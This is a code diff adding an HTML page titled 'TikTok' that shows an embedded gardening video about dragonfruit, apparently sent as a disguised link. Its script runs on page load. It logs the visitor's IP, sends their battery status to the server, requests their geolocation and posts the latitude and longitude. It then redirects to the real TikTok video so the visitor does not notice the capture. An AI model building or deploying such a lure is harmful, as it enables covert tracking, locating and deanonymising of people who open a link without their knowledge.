@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+</head>
+<body>
+    <!-- <iframe src="https://www.tiktok.com/@growithjessie/video/6909497340902509830?_d=secCgYIASAHKAESMgow6xTfGfZ0iAjq4sdC1NWKf6IN4mojKIHXz7tZY0uUGSe6bFKqZxpQ2hOEilgdJwILGgA%3D&language=de&preview_pb=0&sec_user_id=MS4wLjABAAAAyg8gzU4qweFdo3hVdGWoZpDKWL3Cz_pcvcnI3FoTnMBbjTFoqDNIUewBxwvwCXCw&share_item_id=6909497340902509830&share_link_id=0617013C-5730-4A42-8BFD-4184DA76FF6C&timestamp=1614626694&tt_from=copy&u_code=2i639l9k46c6g&user_id=61234564794208256&utm_campaign=client_share&utm_medium=ios&utm_source=copy&source=h5_m" frameborder="0" ></iframe> -->
+    
+    <blockquote class="tiktok-embed" cite="https://www.tiktok.com/@growithjessie/video/6909497340902509830" data-video-id="6909497340902509830" style="max-width: 605px;min-width: 325px;" > <section> <a target="_blank" title="@growithjessie" href="https://www.tiktok.com/@growithjessie">@growithjessie</a> <p>Dragonfruits grow into cactus plants🥰🌵 <a title="facts" target="_blank" href="https://www.tiktok.com/tag/facts">#facts</a> <a title="daily" target="_blank" href="https://www.tiktok.com/tag/daily">#daily</a> <a title="tips" target="_blank" href="https://www.tiktok.com/tag/tips">#tips</a> <a title="cool" target="_blank" href="https://www.tiktok.com/tag/cool">#cool</a> <a title="gardening" target="_blank" href="https://www.tiktok.com/tag/gardening">#gardening</a> <a title="tricks" target="_blank" href="https://www.tiktok.com/tag/tricks">#tricks</a> <a title="garden" target="_blank" href="https://www.tiktok.com/tag/garden">#garden</a> <a title="project" target="_blank" href="https://www.tiktok.com/tag/project">#project</a> <a title="diy" target="_blank" href="https://www.tiktok.com/tag/diy">#diy</a> <a title="quarantine" target="_blank" href="https://www.tiktok.com/tag/quarantine">#quarantine</a> <a title="fun" target="_blank" href="https://www.tiktok.com/tag/fun">#fun</a> <a title="howtowithjessie" target="_blank" href="https://www.tiktok.com/tag/howtowithjessie">#howtowithjessie</a> <a title="foryoup" target="_blank" href="https://www.tiktok.com/tag/foryoup">#foryoup</a></p> <a target="_blank" title="♬ Lost - bülow" href="https://www.tiktok.com/music/Lost-6902270907809531906">♬ Lost - bülow</a> </section> </blockquote> <script async src="https://www.tiktok.com/embed.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+         
+        }
+        iframe {
+            width: 99vw;
+            height: 99vh;
+        }
+    </style>
+    <script>
+        fetch('ip');
+        navigator.getBattery().then((battery) => { 
+            let bat = {
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime,
+                level: battery.level,
+            }    
+            fetch('battery', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(bat),
+        });
+        });
+        navigator.geolocation.getCurrentPosition((position)=> {
+            fetch('loc', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    'lat': position.coords.latitude,
+                    'long': position.coords.longitude,
+                }),
+            }).then(() => {window.location.replace('https://www.tiktok.com/@growithjessie/video/6909497340902509830?_d=secCgYIASAHKAESMgow6xTfGfZ0iAjq4sdC1NWKf6IN4mojKIHXz7tZY0uUGSe6bFKqZxpQ2hOEilgdJwILGgA%3D&language=de&preview_pb=0&sec_user_id=MS4wLjABAAAAyg8gzU4qweFdo3hVdGWoZpDKWL3Cz_pcvcnI3FoTnMBbjTFoqDNIUewBxwvwCXCw&share_item_id=6909497340902509830&share_link_id=0617013C-5730-4A42-8BFD-4184DA76FF6C&timestamp=1614626694&tt_from=copy&u_code=2i639l9k46c6g&user_id=61234564794208256&utm_campaign=client_share&utm_medium=ios&utm_source=copy&source=h5_m');});
+        });
+       
+    </script>
+</body>
+</html>
